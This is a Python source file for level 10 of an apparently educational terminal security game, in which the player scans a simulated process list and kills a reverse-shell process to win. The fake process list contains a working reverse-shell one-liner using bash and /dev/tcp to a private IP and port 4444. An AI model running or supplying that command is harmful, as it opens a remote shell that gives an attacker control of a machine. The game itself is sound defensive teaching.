import time
import os
from rich import print
from rich.prompt import Prompt
from rich.console import Console
from rich.panel import Panel
from level11 import level11
from utils import post_level_menu
from save_system import save_progress

console = Console()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def level10():
    console.print("\n[bold magenta]== LEVEL 10: REVERSE SHELL DEFENSE ==[/bold magenta]")
    time.sleep(0.5)

    console.print("[cyan]ALERT: Suspicious activity detected on the system.[/cyan]")
    time.sleep(1)
    console.print("[yellow]We believe a reverse shell backdoor is active.[/yellow]")
    time.sleep(1)
    console.print("\n[bold]Use the tool:[/bold] [green]detect_shells[/green] to scan running processes.\n")

    while True:
        cmd = Prompt.ask(">>").strip().lower()
        if cmd == "detect_shells":
            console.print("\n[bold cyan]Scanning processes...[/bold cyan]\n")
            time.sleep(1.5)
            processes = [
                "[grey]PID 1023  - /usr/bin/python3 script.py[/grey]",
                "[grey]PID 2274  - /bin/bash[/grey]",
                "[red]PID 7782  - bash -i >& /dev/tcp/10.10.10.1/4444 0>&1[/red]  ← Suspicious!",
                 "[grey]PID 3984  - /usr/sbin/cron[/grey]"
            ]

            for proc in processes:
                console.print(proc)
                time.sleep(0.7)
            break
        else:
            console.print("[red]Unknown command. Try 'detect_shells'[/red]")

    console.print("\n[bold yellow]Identify the PID and terminate the reverse shell before it activates![/bold yellow]")
    console.print("Example: kill 7782\n")

    while True:
        cmd = Prompt.ask(">>").strip().lower()
        if cmd == "kill 7782":
            console.print("[green]Reverse shell terminated successfully![/green]")
            time.sleep(0.7)
            console.print("\n[bold green]System secured. Well done, Agent_47.[/bold green]")
            save_progress(10)
            time.sleep(3)
            clear_screen()
            time.sleep(0.5)
            console.print(Panel.fit("[bold magenta]Level 10 Complete![/bold magenta]", border_style="cyan"))
            time.sleep(0.5)
            post_level_menu(restart_callback=level10, next_level_callback=lambda: (clear_screen(), level11()))
            break
        else:
            console.print("[red]Command failed. Shell is still active![/red]")